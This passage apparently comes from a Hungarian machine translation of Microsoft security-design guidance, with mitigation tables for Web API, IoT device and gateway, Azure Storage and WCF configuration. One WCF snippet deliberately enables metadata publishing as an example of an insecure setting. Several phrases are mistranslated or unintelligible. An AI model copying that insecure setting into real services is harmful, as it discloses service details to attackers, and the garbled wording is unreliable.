A CORS letiltásához használja a [DisableCors] attribútumot. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>A webes API konfigurációs fájljainak bizalmas adatokat tartalmazó szakaszainak titkosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Útmutató: Konfigurációs szakaszok titkosítása ASP.NET 2.0-ban a DPAPI használatával,](https://msdn.microsoft.com/library/ff647398.aspx) [Védett konfigurációs szolgáltató megadása,](https://msdn.microsoft.com/library/68ze1hb2.aspx) [Az Azure Key Vault használata az alkalmazástitkok védelmére](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Lépéseket** | A konfigurációs fájlokat, például a Web.config fájlt, az appsettings.json gyakran használják bizalmas adatok tárolására, például felhasználóneveket, jelszavakat, adatbázis-kapcsolati karakterláncokat és titkosítási kulcsokat. Ha nem védi ezeket az adatokat, az alkalmazás ki van téve a támadók vagy rosszindulatú felhasználók számára, akik bizalmas adatokat, például fiókfelhasználóneveket és jelszavakat, adatbázisneveket és kiszolgálóneveket szereznek be. A központi telepítés típusa (azure/on-prem) alapján titkosítsa a bizalmas fájlok bizalmas szakaszait a DPAPI vagy a szolgáltatások, például az Azure Key Vault használatával. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Annak ellenőrzése, hogy az összes rendszergazdai felület erős hitelesítő adatokkal van-e biztosítva

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | Az eszköz vagy a helyszíni átjáró által elérhetővé tett felügyeleti felületeket erős hitelesítő adatokkal kell biztosítani. Továbbá, minden más kitett felületek, mint a WiFi, SSH, Fájl megosztások, FTP kell biztosítani erős hitelesítő adatokkal. Az alapértelmezett gyenge jelszavakat nem szabad használni. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Annak biztosítása, hogy ismeretlen kód ne legyen végrehajtva az eszközökön

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Biztonságos rendszerindítás és bitlocker eszköztitkosítás engedélyezése Windows 10 IoT Core rendszeren](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Lépéseket** | Az UEFI Secure Boot korlátozza a rendszert, hogy csak egy meghatározott hatóság által aláírt bináris fájlok végrehajtását engedélyezze. Ez a funkció megakadályozza, hogy ismeretlen kódot hajtson végre a platformon, és potenciálisan gyengíti a biztonsági állapotát. Engedélyezze az UEFI biztonságos rendszerindítást, és korlátozza a kód aláírásához megbízhatónak megbízható hitelesítésszolgáltatók listáját. Írja alá az eszközön telepített összes kódot az egyik megbízható hatóság használatával. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Az Operációs rendszer és az IoT-eszköz további partícióinak titkosítása bittárolóval

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | A Windows 10 IoT Core a bitlocker eszköztitkosítás könnyű verzióját valósítja meg, amely erősen függ a Platformon lévő TPM jelenlététől, beleértve a szükséges preOS protokollt az UEFI-ben, amely elvégzi a szükséges méréseket. Ezek a preOS-mérések biztosítják, hogy az operációs rendszer később végleges nyilvántartást, hogy az operációs rendszer indult. Titkosítsa az operációs rendszer partícióit bittárolóval és további partíciókkal arra az esetre, ha bizalmas adatokat tárolnának. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Annak ellenőrzése, hogy csak a minimális szolgáltatások/funkciók legyenek engedélyezve az eszközökön

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | Ne engedélyezze és ne kapcsolja ki az operációs rendszer olyan szolgáltatásait vagy szolgáltatásait, amelyek nem szükségesek a megoldás működéséhez. Például ha az eszköz nem igényel felhasználói felületet, telepítse a Windows IoT Core rendszert fej nélküli üzemmódba. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Az IoT Field Gateway operációs rendszerének és további partícióinak titkosítása bittárolóval

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT field átjáró | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | A Windows 10 IoT Core a bitlocker eszköztitkosítás könnyű verzióját valósítja meg, amely erősen függ a Platformon lévő TPM jelenlététől, beleértve a szükséges preOS protokollt az UEFI-ben, amely elvégzi a szükséges méréseket. Ezek a preOS-mérések biztosítják, hogy az operációs rendszer később végleges nyilvántartást, hogy az operációs rendszer indult. Titkosítsa az operációs rendszer partícióit bittárolóval és további partíciókkal arra az esetre, ha bizalmas adatokat tárolnának. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Annak ellenőrzése, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosultak-e a telepítés során

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT field átjáró | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | Annak ellenőrzése, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosultak-e a telepítés során |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Győződjön meg arról, hogy a Cloud Gateway olyan folyamatot valósít meg, amely naprakészen tartja a csatlakoztatott eszközök belső vezérlőprogramját

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT felhőátjáró | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | Átjáró választás - Azure IoT Hub |
| **Referencia**              | [IoT Hub-eszközkezelés –](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/) [Eszközbelsővezérlő frissítése](../../iot-hub/tutorial-firmware-update.md) |
| **Lépéseket** | Az LWM2M az IoT-eszközkezelésnyílt mobilszövetségének protokollja. Az Azure IoT-eszközkezelés lehetővé teszi, hogy az eszközfeladatok használatával kommunikáljon a fizikai eszközökkel. Győződjön meg arról, hogy a Cloud Gateway egy olyan folyamatot valósít meg, amely rendszeresen naprakészen tartja az eszközt és más konfigurációs adatokat az Azure IoT Hub eszközkezelés használatával. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Annak ellenőrzése, hogy az eszközök végponti biztonsági vezérlői a szervezeti házirendeknek megfelelően vannak-e konfigurálva

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Gép megbízhatósági határa | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | Győződjön meg arról, hogy az eszközök végpontbiztonsági vezérlőkkel rendelkeznek, például a lemezszintű titkosítás bittárolójával, a frissített aláírásokkal rendelkező vírusvédelemmel, az állomásalapú tűzfallal, az operációs rendszer frissítésével, a csoportházirendekkel stb. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Az Azure storage-hozzáférési kulcsok biztonságos kezelésének biztosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Üzembe helyezés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Az Azure Storage biztonsági útmutatója – A tárfiók kulcsainak kezelése](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Lépéseket** | <p>Kulcstároló: Ajánlott az Azure Storage-hozzáférési kulcsok at az Azure Key Vault titkos, és az alkalmazások lekérni a kulcsot a key vaultból. Ez a következő okok miatt ajánlott:</p><ul><li>Az alkalmazás soha nem lesz a tárolási kulcs hardcoded egy konfigurációs fájl, amely eltávolítja, hogy a sugárút valaki egyre hozzáférést a kulcsokat külön engedély nélkül</li><li>A kulcsokhoz való hozzáférés az Azure Active Directory használatával vezérelhető. Ez azt jelenti, hogy a fiók tulajdonosa hozzáférést biztosíthat a maroknyi alkalmazáshoz, amelyeknek az Azure Key Vaultból kell letölteniük a kulcsokat. Más alkalmazások nem férhetnek hozzá a kulcsokhoz anélkül, hogy kifejezetten engedélyt adnának nekik</li><li>Kulcs-regenerálás: Ajánlott, hogy egy folyamat, amely az Azure storage hozzáférési kulcsok biztonsági okokból újragenerálása. A kulcsregeneráció megtervezésének okait és módját az Azure Storage Biztonsági útmutató referenciacikke dokumentálja.</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható eredetek engedélyezettek, ha a CORS engedélyezve van az Azure storage-ban

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [CORS-támogatás Azure Storage-szolgáltatásokhoz](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Lépéseket** | Az Azure Storage lehetővé teszi a CORS – Több forrásból származó erőforrás-megosztás engedélyezését. Minden tárfiókhoz megadhatja azokat a tartományokat, amelyek hozzáférhetnek az adott tárfiók ban lévő erőforrásokhoz. Alapértelmezés szerint a CORS le van tiltva az összes szolgáltatás. Engedélyezheti a CORS segítségével a REST API vagy a storage-ügyfélkódtár hívja meg a szolgáltatási szabályzatok beállításának egyik módszerét. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>A WCF szolgáltatásszabályozási szolgáltatásának engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | .NET keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Referencia**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Erősítik Királyság](https://vulncat.fortify.com) |
| **Lépéseket** | <p>A rendszererőforrások használatának korlátozásának elnem e-k korlátozása erőforrás-kimerülést és végső soron szolgáltatásmegtagadást eredményezhet.</p><ul><li>**MAGYARÁZAT:** A Windows Kommunikációs Alaprendszer (WCF) lehetővé teszi a szolgáltatáskérelmek szabályozását. A túl sok ügyfélkérés engedélyezése eláraszthatja a rendszert, és kimerítheti az erőforrásait. Másrészt, ha csak kis számú kérelmet engedélyez egy szolgáltatáshoz, az megakadályozhatja, hogy a jogos felhasználók használják a szolgáltatást. Minden szolgáltatást külön-külön kell beállítani, és úgy kell konfigurálni, hogy lehetővé tegye a megfelelő mennyiségű erőforrást.</li><li>**AJÁNLÁSOK** Engedélyezze a WCF szolgáltatásszabályozási szolgáltatását, és állítsa be az alkalmazásnak megfelelő korlátokat.</li></ul>|

### <a name="example"></a>Példa
A következő egy példa konfiguráció szabályozás engedélyezve:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-Információ közzététele metaadatokon keresztül

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | .NET keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Referencia**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Erősítik Királyság](https://vulncat.fortify.com) |
| **Lépéseket** | A metaadatok segítségével a támadók megismerhetik a rendszert, és megtervezhetik a támadások egy formáját. A WCF-szolgáltatások beállíthatók a metaadatok felfedésére. A metaadatok részletes szolgáltatásleírást adnak, ezért nem sugározhatók éles környezetben. `HttpGetEnabled`  /  A `HttpsGetEnabled` ServiceMetaData osztály tulajdonságai határozzák meg, hogy egy szolgáltatás elérhetővé teszi-e a metaadatokat | 

### <a name="example"></a>Példa
Az alábbi kód arra utasítja a WCF-et, hogy sugározza a szolgáltatás metaadatait
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Éles környezetben ne sugározza a szolgáltatás metaadatait. Állítsa a ServiceMetaData osztály HttpGetEnabled / HttpsGetEnabled tulajdonságait false értékre. 

### <a name="example"></a>Példa
Az alábbi kód arra utasítja a WCF-et, hogy ne sugározza a szolgáltatás metaadatait. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
